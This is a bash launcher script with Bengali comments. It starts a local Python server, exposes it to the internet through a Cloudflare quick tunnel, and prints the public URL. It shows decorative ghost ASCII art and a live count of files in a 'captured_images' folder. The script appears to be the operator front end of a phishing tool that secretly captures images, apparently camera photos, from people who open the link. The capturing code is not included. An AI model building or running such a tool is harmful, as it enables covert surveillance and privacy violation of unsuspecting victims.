#!/usr/bin/env bash

# ১. পুরনো প্রসেস ও লগ পরিষ্কার করা (পোর্ট এবং পাইথন সার্ভার কিল করা)
fuser -k 9030/tcp 2>/dev/null
pkill -f "server.py" 2>/dev/null
pkill -f "cloudflared tunnel" 2>/dev/null
rm -f /root/tunnel.log

# ২. ছবি সেভ করার ফোল্ডার নিশ্চিত করা (উবুন্টু এবং মূল ডাউনলোড ফোল্ডার লিংক করা)
mkdir -p /root/captured_images
mkdir -p /sdcard/Download/captured_images

# কার্সার লুকানো এবং Ctrl+C চাপলে সব ব্যাকগ্রাউন্ড প্রসেস ও কার্সার স্বাভাবিক করার ব্যবস্থা
printf '\033[?25l'
cleanup() {
    printf "\033[?25h\033[0m\n"
    kill "$SERVER_PID" "$TUNNEL_PID" 2>/dev/null
    fuser -k 9030/tcp 2>/dev/null
    pkill -f "server.py" 2>/dev/null
    echo -e "\033[1;31m[!] Server & Tunnel Stopped.\033[0m"
    exit 0
}
trap cleanup INT TERM

clear 2>/dev/null || printf '\033[H\033[2J\033[3J'

# ৩. ব্যাকগ্রাউন্ডে পাইথন সার্ভার (port 9030) ও ক্লাউডফ্লেয়ার টানেল চালু করা
python3 /sdcard/Download/server.py &
SERVER_PID=$!
sleep 3

/root/cloudflared tunnel --url http://127.0.0.1:9030 > /root/tunnel.log 2>&1 &
TUNNEL_PID=$!

# ৪. পাবলিক লিংক তৈরি হওয়ার জন্য অপেক্ষা করা (সর্বোচ্চ ১৫ সেকেন্ড)
echo -e "\033[1;33m[x] Initializing Server & Establishing Cloudflare Tunnel...\033[0m"
URL=""
for i in {1..15}; do
    sleep 1
    URL=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' /root/tunnel.log | head -n 1)
    if [ -n "$URL" ]; then
        break
    fi
done

clear 2>/dev/null || printf '\033[H\033[2J\033[3J'

# ৫. ভূতের পরিবার আর্ট
lines=()
while IFS= read -r line; do
    lines+=("$line")
done <<'ART'
         ,/\_/\_/\_/\
       ,/\/         \
     ,/\/     .--.    \
    /\/      /    \    |
   /\/      | M  N |    |
  /\/        \ __ /     |
  |            ----      |
  |           /    \     |
 /_\         /      \    |
(   \_______/        \___|
 \                        \
  \      /\        /\     |
   \    /  \      /  \    |
    \  /    \    /    \   |
     \/      \  /      \  |
     ||\\\\    \/       \ |
     || |||             \\|
    /  \|||
   /         |      |
  |          |      |
  |          |      |
   \         |      |
    \        |      |
     \       |      |
      \,     |      |
        \    /\     /\
        /\  /  \   /  \
       /  \/    \ /    \
      /||||      |      |
     / |||||    /|      |\
                MAA KALI
     .-""-.                              .-""-.
    ( Y  Z )                            ( V  W )
     \ ~~ /                              \ ~~ /
      '--'                                '--'
     /|  |\                              /|  |\
    / |  | \                            / |  | \
        ||                                  ||
       /  \                                /  \
      (    )                              (    )
       '--'                                '--'
ART

banner=(
" ##  #      #  ### ### #  # # # #"
"#   # #    # #  #   #  # #  # # #"
"# # # #    ###  #   #  ##   # # #"
"# #  #     # #  #   #  # #  # # #"
" ##   #    # #  #  ### #  #  #  ###"
)
banner_start_row=4
pad_width=48

printf '\033[1;37m'

eye_rows=()
eye_cols=()

row=0
for line in "${lines[@]}"; do
    plain="$line"
    for marker in M N Y Z V W; do
        case "$plain" in
            *"$marker"*)
                case "$plain" in
                    *MAA*) continue ;;
                esac
                prefix="${plain%%$marker*}"
                col=${#prefix}
                eye_rows+=("$row")
                eye_cols+=("$col")
                plain="${plain/$marker/ }"
                ;;
        esac
    done

    banner_idx=$((row - banner_start_row))
    if [ "$banner_idx" -ge 0 ] && [ "$banner_idx" -lt "${#banner[@]}" ]; then
        printf '%-*s' "$pad_width" "$plain"
        printf '\033[1;31m%s\033[1;37m\n' "${banner[$banner_idx]}"
    else
        printf '%s\n' "$plain"
    fi
    row=$((row+1))
done

printf '\033[0m'
printf '\033[1;31m    MAA DAKINI                              MAA YOGINI\033[0m\n'
printf '\033[1;37m===========================================================\033[0m\n'

if [ -n "$URL" ]; then
    printf '\033[1;32m [+] LIVE PUBLIC URL : \033[1;33m%s\033[0m\n' "$URL"
else
    printf '\033[1;31m [-] ERROR: Tunnel connection failed! Check internet.\033[0m\n'
fi
printf '\033[1;37m===========================================================\033[0m\n'
printf '\033[1;36m [+] CAPTURED IMAGES : \033[1;33mCounting live from folder...\033[0m\n'
printf '\033[1;37m===========================================================\033[0m\n'
printf '\033[1;30m   (বন্ধ করতে Ctrl+C চাপুন)\033[0m\n'

on=1
while true; do
    count=$(ls -1 /root/captured_images/ 2>/dev/null | wc -l)

    printf '\033[s'
    printf '\033[21;25H'
    printf '\033[1;33m%3d Files\033[0m' "$count"
    printf '\033[u'

    for i in "${!eye_rows[@]}"; do
        r="${eye_rows[$i]}"
        c="${eye_cols[$i]}"
        printf '\033[%d;%dH' "$((r+1))" "$((c+1))"
        if [ "$on" -eq 1 ]; then
            printf '\033[1;31mo\033[0m'
        else
            printf ' '
        fi
    done
    if [ "$on" -eq 1 ]; then on=0; else on=1; fi
    sleep 0.6
done